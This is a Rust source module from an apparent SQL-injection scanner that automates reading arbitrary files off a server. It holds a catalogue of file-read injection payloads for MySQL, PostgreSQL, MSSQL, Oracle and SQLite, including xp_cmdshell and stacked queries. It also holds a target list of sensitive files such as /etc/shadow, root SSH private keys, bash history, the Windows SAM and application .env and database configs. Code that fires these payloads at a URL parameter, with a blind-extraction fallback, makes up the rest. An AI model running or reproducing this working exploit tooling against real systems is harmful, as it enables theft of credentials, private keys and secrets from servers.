//! File-read payloads: read arbitrary files from the server via SQL injection.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    models::{BlindExtractionConfig, BlindTechnique, HttpResponse},
    similarity::{calculate_similarity, detect_sql_error},
};

/// A single file-read payload.
#[derive(Debug, Clone)]
pub struct FileReadPayload {
    /// The SQL fragment injected after the vulnerable parameter
    pub payload: String,
    /// Human-readable description of the technique
    pub description: &'static str,
    /// Target DBMS
    pub dbms: &'static str,
    /// Privilege needed for the payload to work (empty = none special)
    pub required_privilege: &'static str,
}

/// Result of a file-read attempt
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct FileReadResult {
    /// Content returned by the DBMS (may be partial)
    pub content: Option<String>,
    /// Payload that succeeded
    pub payload_used: String,
    /// DBMS that was targeted
    pub dbms: String,
    /// Total HTTP requests made
    pub total_requests: usize,
}

/// Database of file-read payloads grouped by DBMS.
pub struct FileReadPayloads;

impl FileReadPayloads {
    /// Common sensitive files worth targeting during a pentest.
    pub fn common_targets() -> Vec<(&'static str, &'static str)> {
        vec![
            // Linux / Unix
            ("/etc/passwd", "Linux user accounts"),
            ("/etc/shadow", "Linux password hashes (root only)"),
            ("/etc/hosts", "Hostname mappings"),
            ("/etc/hostname", "Machine hostname"),
            ("/etc/os-release", "OS version info"),
            ("/proc/version", "Kernel version"),
            (
                "/proc/self/environ",
                "Current process environment variables",
            ),
            ("/proc/self/cmdline", "Current process command line"),
            ("/proc/self/maps", "Memory map (ASLR leak)"),
            ("/etc/mysql/my.cnf", "MySQL server config"),
            ("/etc/mysql/mysql.conf.d/mysqld.cnf", "MySQL daemon config"),
            ("/var/lib/mysql/mysql/user.MYD", "MySQL user table (raw)"),
            (
                "/etc/postgresql/14/main/pg_hba.conf",
                "PostgreSQL host auth",
            ),
            (
                "/etc/postgresql/14/main/postgresql.conf",
                "PostgreSQL config",
            ),
            ("/var/log/auth.log", "SSH / PAM authentication log"),
            ("/var/log/syslog", "System log"),
            ("/var/log/apache2/access.log", "Apache access log"),
            ("/var/log/apache2/error.log", "Apache error log"),
            ("/var/log/nginx/access.log", "Nginx access log"),
            ("/var/log/nginx/error.log", "Nginx error log"),
            (
                "/etc/apache2/sites-enabled/000-default.conf",
                "Apache vhost config",
            ),
            ("/etc/nginx/nginx.conf", "Nginx main config"),
            ("/etc/nginx/sites-enabled/default", "Nginx default site"),
            ("/home/www/.ssh/id_rsa", "www-data SSH private key"),
            ("/root/.ssh/id_rsa", "root SSH private key"),
            ("/root/.bash_history", "root bash history"),
            ("/home/www/.bash_history", "www-data bash history"),
            // Windows
            (
                "C:/Windows/System32/drivers/etc/hosts",
                "Windows hosts file",
            ),
            ("C:/Windows/win.ini", "Windows ini"),
            ("C:/inetpub/wwwroot/web.config", "IIS web.config"),
            ("C:/Windows/System32/config/SAM", "SAM database (locked)"),
            ("C:/Windows/repair/SAM", "SAM backup"),
            ("C:/Users/Administrator/.ssh/id_rsa", "Admin SSH key"),
            ("C:/xampp/mysql/bin/my.ini", "XAMPP MySQL config"),
            ("C:/wamp/bin/mysql/mysql5.7/my.ini", "WAMP MySQL config"),
            // Application config files
            ("/var/www/html/.env", "Laravel / generic .env"),
            ("/var/www/html/config.php", "PHP app config"),
            ("/var/www/html/wp-config.php", "WordPress config"),
            ("/var/www/html/config/database.yml", "Rails database config"),
            ("/var/www/html/application.properties", "Spring Boot config"),
            ("/var/www/html/settings.py", "Django settings"),
        ]
    }

    /// All file-read payloads for the given target file.
    pub fn all_payloads(target_file: &str) -> Vec<FileReadPayload> {
        let f = target_file;
        vec![
            // ── MySQL ──────────────────────────────────────────────────────────────
            FileReadPayload {
                payload: format!("' UNION SELECT LOAD_FILE('{}'),NULL-- ", f),
                description: "MySQL LOAD_FILE 1-col",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileReadPayload {
                payload: format!("' UNION SELECT LOAD_FILE('{}'),NULL,NULL-- ", f),
                description: "MySQL LOAD_FILE 2-col",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileReadPayload {
                payload: format!("' UNION SELECT NULL,LOAD_FILE('{}'),NULL-- ", f),
                description: "MySQL LOAD_FILE col2",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileReadPayload {
                payload: format!(
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING(LOAD_FILE('{}'),1,100)))-- ",
                    f
                ),
                description: "MySQL LOAD_FILE via EXTRACTVALUE error",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileReadPayload {
                payload: format!(
                    "' AND UPDATEXML(1,CONCAT(0x7e,SUBSTRING(LOAD_FILE('{}'),1,100)),1)-- ",
                    f
                ),
                description: "MySQL LOAD_FILE via UPDATEXML error",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            FileReadPayload {
                payload: format!(
                    "' UNION SELECT LOAD_FILE(0x{}),NULL-- ",
                    f.bytes().map(|b| format!("{:02x}", b)).collect::<String>()
                ),
                description: "MySQL LOAD_FILE hex path",
                dbms: "MySQL",
                required_privilege: "FILE",
            },
            // ── PostgreSQL ─────────────────────────────────────────────────────────
            FileReadPayload {
                payload: format!(
                    "'; CREATE TEMP TABLE _r(t TEXT); COPY _r FROM '{}'; SELECT * FROM _r-- ",
                    f
                ),
                description: "PostgreSQL COPY FROM stacked",
                dbms: "PostgreSQL",
                required_privilege: "SUPERUSER",
            },
            FileReadPayload {
                payload: format!("' UNION SELECT pg_read_file('{}',0,65536),NULL-- ", f),
                description: "PostgreSQL pg_read_file",
                dbms: "PostgreSQL",
                required_privilege: "pg_read_server_files",
            },
            FileReadPayload {
                payload: format!(
                    "' UNION SELECT (SELECT string_agg(line,E'\\n') FROM pg_read_file('{}') AS line),NULL-- ",
                    f
                ),
                description: "PostgreSQL pg_read_file aggregated",
                dbms: "PostgreSQL",
                required_privilege: "pg_read_server_files",
            },
            FileReadPayload {
                payload: format!("'; SELECT pg_read_binary_file('{}')-- ", f),
                description: "PostgreSQL pg_read_binary_file",
                dbms: "PostgreSQL",
                required_privilege: "pg_read_server_files",
            },
            FileReadPayload {
                payload: format!(
                    "' AND 1=CAST((SELECT pg_read_file('{}',0,500)) AS INTEGER)-- ",
                    f
                ),
                description: "PostgreSQL pg_read_file cast error",
                dbms: "PostgreSQL",
                required_privilege: "pg_read_server_files",
            },
            // ── MSSQL ──────────────────────────────────────────────────────────────
            FileReadPayload {
                payload: format!(
                    "'; CREATE TABLE _r(c NVARCHAR(MAX)); \
                     BULK INSERT _r FROM '{}' WITH (ROWTERMINATOR='\\n'); \
                     SELECT c FROM _r-- ",
                    f
                ),
                description: "MSSQL BULK INSERT stacked",
                dbms: "MSSQL",
                required_privilege: "BULKADMIN or ADMINISTER BULK OPERATIONS",
            },
            FileReadPayload {
                payload: format!("'; EXEC xp_cmdshell 'type \"{}\"'-- ", f),
                description: "MSSQL xp_cmdshell type",
                dbms: "MSSQL",
                required_privilege: "sysadmin",
            },
            FileReadPayload {
                payload: format!(
                    "' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '{}',SINGLE_BLOB) AS x-- ",
                    f
                ),
                description: "MSSQL OPENROWSET BULK",
                dbms: "MSSQL",
                required_privilege: "ADMINISTER BULK OPERATIONS",
            },
            FileReadPayload {
                payload: format!(
                    "'; DECLARE @v NVARCHAR(MAX); \
                     SELECT @v=BulkColumn FROM OPENROWSET(BULK '{}',SINGLE_BLOB) x; \
                     SELECT CAST(@v AS INT)-- ",
                    f
                ),
                description: "MSSQL OPENROWSET cast error exfil",
                dbms: "MSSQL",
                required_privilege: "ADMINISTER BULK OPERATIONS",
            },
            // ── Oracle ─────────────────────────────────────────────────────────────
            FileReadPayload {
                payload: "' UNION SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1) FROM DUAL-- ".to_string(),
                description: "Oracle UTL_FILE.GET_LINE",
                dbms: "Oracle",
                required_privilege: "UTL_FILE execute",
            },
            FileReadPayload {
                payload: format!(
                    "'; DECLARE fh UTL_FILE.FILE_TYPE; buf VARCHAR2(32767); \
                     BEGIN fh:=UTL_FILE.FOPEN('{}','r'); \
                     UTL_FILE.GET_LINE(fh,buf); UTL_FILE.FCLOSE(fh); \
                     RAISE_APPLICATION_ERROR(-20001,buf); END;-- ",
                    f
                ),
                description: "Oracle UTL_FILE error exfil",
                dbms: "Oracle",
                required_privilege: "UTL_FILE execute",
            },
            FileReadPayload {
                payload: format!(
                    "' AND 1=DBMS_LOB.SUBSTR(BFILENAME('DATADIR','{}'),50,1)-- ",
                    f
                ),
                description: "Oracle DBMS_LOB BFILENAME",
                dbms: "Oracle",
                required_privilege: "CREATE DIRECTORY",
            },
            // ── SQLite ─────────────────────────────────────────────────────────────
            FileReadPayload {
                payload: format!(
                    "'; ATTACH DATABASE '{}' AS leak; SELECT * FROM leak.sqlite_master-- ",
                    f
                ),
                description: "SQLite ATTACH DATABASE",
                dbms: "SQLite",
                required_privilege: "filesystem access",
            },
            FileReadPayload {
                payload: format!("'; CREATE TABLE _r(c TEXT); .read {}-- ", f),
                description: "SQLite .read command (CLI only)",
                dbms: "SQLite",
                required_privilege: "filesystem access",
            },
        ]
    }

    /// Quick check: does the DBMS support file read at all?
    pub fn supports_file_read(dbms: &str) -> bool {
        matches!(dbms, "MySQL" | "PostgreSQL" | "MSSQL" | "Oracle" | "SQLite")
    }
}

impl SqliDetector {
    /// Attempt to read a remote file via SQL injection using fast payloads,
    /// falling back to blind extraction if no quick win is found.
    pub async fn file_read(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        target_file: &str,
    ) -> Result<FileReadResult> {
        info!("Starting file-read for '{}' on {}", target_file, dbms);
        let baseline = self.send_request(url).await?;
        let mut total_requests = 1;

        // 1. Fast path: try UNION / error-based payloads
        let payloads: Vec<FileReadPayload> = FileReadPayloads::all_payloads(target_file)
            .into_iter()
            .filter(|p| p.dbms.eq_ignore_ascii_case(dbms))
            .collect();

        for p in &payloads {
            if self.is_scan_cancelled() {
                break;
            }
            let test_url = self.build_test_url(url, param, original_value, &p.payload);
            match self.send_request(&test_url).await {
                Ok(resp) => {
                    total_requests += 1;
                    if let Some(content) = Self::extract_file_content(&baseline, &resp) {
                        info!("File-read succeeded with payload: {}", p.description);
                        return Ok(FileReadResult {
                            content: Some(content),
                            payload_used: p.payload.clone(),
                            dbms: dbms.to_string(),
                            total_requests,
                        });
                    }
                }
                Err(e) => {
                    debug!("File-read payload failed: {}", e);
                }
            }
        }

        // 2. Fallback: blind extraction using a DBMS-specific query
        info!(
            "Fast payloads failed; attempting blind extraction for {}",
            target_file
        );
        let custom_query = Self::file_read_query(dbms, target_file);
        if let Some(query) = custom_query {
            let config = BlindExtractionConfig {
                target_table: String::new(),
                target_column: String::new(),
                custom_query: Some(query),
                where_clause: None,
                max_rows: 1,
                max_length_per_value: 2000,
                technique: BlindTechnique::Boolean,
            };

            let blind_result = self
                .extract_data_blind(
                    url,
                    param,
                    original_value,
                    dbms,
                    &config,
                    &baseline,
                    None,
                    None,
                    None,
                    None,
                )
                .await;

            match blind_result {
                Ok(result) => {
                    total_requests += result.total_requests;
                    if !result.extracted_values.is_empty() {
                        let content = result.extracted_values.join("\n");
                        return Ok(FileReadResult {
                            content: Some(content),
                            payload_used: format!("blind: {}", dbms),
                            dbms: dbms.to_string(),
                            total_requests,
                        });
                    }
                }
                Err(e) => {
                    warn!("Blind file-read extraction failed: {}", e);
                }
            }
        }

        warn!("All file-read techniques failed for '{}'", target_file);
        Ok(FileReadResult {
            content: None,
            payload_used: String::new(),
            dbms: dbms.to_string(),
            total_requests,
        })
    }

    /// Build a DBMS-specific query for reading a file.
    fn file_read_query(dbms: &str, target_file: &str) -> Option<String> {
        match dbms.to_lowercase().as_str() {
            "mysql" | "mariadb" => Some(format!("SELECT LOAD_FILE('{}')", target_file)),
            "postgresql" => Some(format!(
                "SELECT pg_read_file('{}',0,10000)",
                target_file.replace('\\', "\\\\")
            )),
            "mssql" => Some(format!(
                "SELECT BulkColumn FROM OPENROWSET(BULK '{}',SINGLE_CLOB) AS x",
                target_file
            )),
            _ => None,
        }
    }

    /// Heuristic extraction of file content from a response.
    fn extract_file_content(baseline: &HttpResponse, response: &HttpResponse) -> Option<String> {
        // Error-based: SQL error messages often contain the file content
        if detect_sql_error(&response.body).is_some() {
            return Some(response.body.clone());
        }

        // UNION-based: significant body change indicates reflection
        if baseline.status != response.status {
            return Some(response.body.clone());
        }

        let sim = calculate_similarity(&baseline.body, &response.body);
        if sim < 0.85 {
            // Body changed meaningfully — return the new body for manual analysis
            Some(response.body.clone())
        } else {
            None
        }
    }
}
